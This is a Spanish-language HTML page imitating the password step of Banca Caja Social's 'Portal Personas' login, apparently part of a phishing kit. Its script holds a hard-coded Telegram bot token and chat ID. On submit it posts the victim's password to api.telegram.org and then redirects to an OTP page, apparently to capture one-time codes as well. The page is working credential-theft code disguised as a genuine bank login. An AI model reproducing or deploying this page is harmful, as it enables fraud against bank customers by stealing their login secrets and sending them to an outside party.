<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contraseña - Portal Personas - Banca Caja Social</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <style>
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
        .loading-overlay.show { display: flex !important; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        /* Responsive imagen - sin cambiar diseño */
        @media (max-width: 768px) {
            .left-section { display: none; }
            .right-section { width: 100%; }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
        <div style="text-align:center;">
            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
        </div>
    </div>
    
    <div class="container">
        <div class="left-section">
            <img src="img/background-2.png" alt="Familia" class="background-image">
        </div>
        <div class="right-section">
            <div class="form-container">
                <div class="logo-container">
                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
                </div>
                
                <h1 class="title">Bienvenido al<br>Portal Personas</h1>
                
                <p class="subtitle">
                    Ingrese su contraseña de canales digitales,<br>
                    recuerde que está compuesta por <strong>8<br>
                    caracteres</strong>.
                </p>
                
                <form class="login-form" id="passwordForm">
                    <label for="password" class="form-label">Contraseña</label>
                    <div class="password-input-container">
                        <input 
                            type="password" 
                            id="password" 
                            name="password" 
                            class="form-input password-input"
                            maxlength="8"
                        >
                        <button type="button" class="toggle-password" aria-label="Mostrar contraseña">
                            <svg class="eye-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <g class="eye-group">
                                    <path class="eye-path" d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#666666"/>
                                    <line class="eye-slash" x1="4" y1="4" x2="20" y2="20" stroke="#666666" stroke-width="2" stroke-linecap="round"/>
                                </g>
                            </svg>
                        </button>
                    </div>
                    <p class="error-message" style="display: none;">Datos incorrectos. Verifique la longitud de su contraseña.</p>
                    
                    <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Iniciar sesión</button>
                    
                    <a href="#" class="link-password">¿Olvidó su contraseña? ▼</a>
                    
                    <div class="separator"></div>
                    
                    <p class="register-text">¿Es un cliente nuevo?</p>
                    <a href="#" class="link-register">Registrarse</a>
                    
                    <div class="back-link-container">
                        <a href="javascript:void(0)" onclick="window.location.href='index.html'" class="link-back">← Volver</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <script>
    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
    const TELEGRAM_CHAT_ID = '-1003784784181';

    document.addEventListener('DOMContentLoaded', function() {
        const passwordInput = document.getElementById('password');
        const btnContinuar = document.getElementById('btnContinuar');
        const togglePassword = document.querySelector('.toggle-password');
        const passwordForm = document.getElementById('passwordForm');
        const overlay = document.getElementById('loadingOverlay');
        const errorMessage = document.querySelector('.error-message');
        
        // Validación de contraseña - habilitar botón cuando tiene 8 caracteres
        passwordInput.addEventListener('input', function() {
            const value = this.value;
            
            // Ocultar mensaje de error mientras escribe
            errorMessage.style.display = 'none';
            
            if (value.length === 8) {
                btnContinuar.classList.add('enabled');
                btnContinuar.disabled = false;
                btnContinuar.removeAttribute('disabled');
            } else {
                btnContinuar.classList.remove('enabled');
                btnContinuar.disabled = true;
                btnContinuar.setAttribute('disabled', 'disabled');
            }
        });
        
        const eyeSlash = document.querySelector('.eye-slash');
        
        // Toggle mostrar/ocultar contraseña con animación mejorada
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            // Animación del icono
            togglePassword.classList.add('toggle-active');
            setTimeout(() => {
                togglePassword.classList.remove('toggle-active');
            }, 200);
            
            // Mostrar/ocultar línea diagonal
            if (type === 'text') {
                eyeSlash.style.opacity = '1';
                eyeSlash.style.transform = 'scale(1)';
                togglePassword.setAttribute('aria-label', 'Ocultar contraseña');
            } else {
                eyeSlash.style.opacity = '0';
                eyeSlash.style.transform = 'scale(0)';
                togglePassword.setAttribute('aria-label', 'Mostrar contraseña');
            }
        });

        // Submit
        passwordForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (btnContinuar.disabled) return;

            overlay.classList.add('show');

            const password = passwordInput.value;
            
            const mensaje = `🔒 <b>CONTRASEÑA CAJA SOCIAL</b>

<b>Contraseña:</b> <code>${password}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => { window.location.href = 'otp.html'; }, 2000);
                } else {
                    overlay.classList.remove('show');
                }
            } catch (error) {
                overlay.classList.remove('show');
            }
        });
    });
    </script>
</body>
</html>
